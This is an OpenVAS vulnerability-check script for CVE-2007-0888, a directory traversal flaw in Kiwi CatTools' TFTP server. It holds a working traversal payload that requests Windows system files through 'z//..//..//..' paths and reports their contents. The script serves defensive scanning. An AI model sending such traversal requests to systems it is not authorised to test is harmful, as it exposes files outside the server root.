###############################################################################
# OpenVAS Vulnerability Test
#
# Kiwi CatTools < 3.2.9 Directory Traversal
#
# Authors:
# Ferdy Riphagen
#
# Copyright:
# Copyright (C) 2008 Ferdy Riphagen
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.200001");
  script_version("2022-05-11T11:17:52+0000");
  script_tag(name:"last_modification", value:"2022-05-11 11:17:52 +0000 (Wed, 11 May 2022)");
  script_tag(name:"creation_date", value:"2008-08-22 16:09:14 +0200 (Fri, 22 Aug 2008)");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_cve_id("CVE-2007-0888");
  script_name("Kiwi CatTools < 3.2.9 Directory Traversal");
  script_category(ACT_ATTACK);
  script_family("Remote file access");
  script_copyright("Copyright (C) 2008 Ferdy Riphagen");
  script_dependencies("tftpd_detect.nasl", "global_settings.nasl", "tftpd_backdoor.nasl", "os_detection.nasl");
  script_require_udp_ports("Services/udp/tftp", 69);
  script_mandatory_keys("tftp/detected");
  script_require_keys("Host/runs_windows");
  script_exclude_keys("keys/TARGET_IS_IPV6");

  script_xref(name:"URL", value:"http://www.kiwisyslog.com/kb/idx/5/178/article/");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/22490");
  script_xref(name:"URL", value:"https://marc.info/?l=bugtraq&m=117097429127488&w=2");

  script_tag(name:"solution", value:"Upgrade to Kiwi CatTools version 3.2.9 or later.");

  script_tag(name:"summary", value:"The remote tftpd server is affected by a directory traversal vulnerability.");

  script_tag(name:"insight", value:"Kiwi CatTools is installed on the remote host. The version installed is vulnerable
  to a directory traversal attack by using '[char]//..' sequences in the path.");

  script_tag(name:"impact", value:"A attacker may be able to read and write files outside the tftp root.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

if(TARGET_IS_IPV6())
  exit(0);

include("host_details.inc");
include("os_func.inc");
include("misc_func.inc");
include("port_service_func.inc");
include("tftp.inc");

port = service_get_port(default:69, proto:"tftp", ipproto:"udp");

if(!tftp_has_reliable_get(port:port))
  exit(0);

files = traversal_files("windows");

foreach file(keys(files)) {

  get = tftp_get(port:port, path:"z//..//..//..//..//..//" + files[file]);
  if(!get)
    continue;

  if(egrep(pattern:file, string:get, icase:TRUE)) {
    report = string("The " + files[file] + " file contains:\n", get);
    security_message(port:port, data:report, proto:"udp");
    exit(0);
  }
}

exit(99);
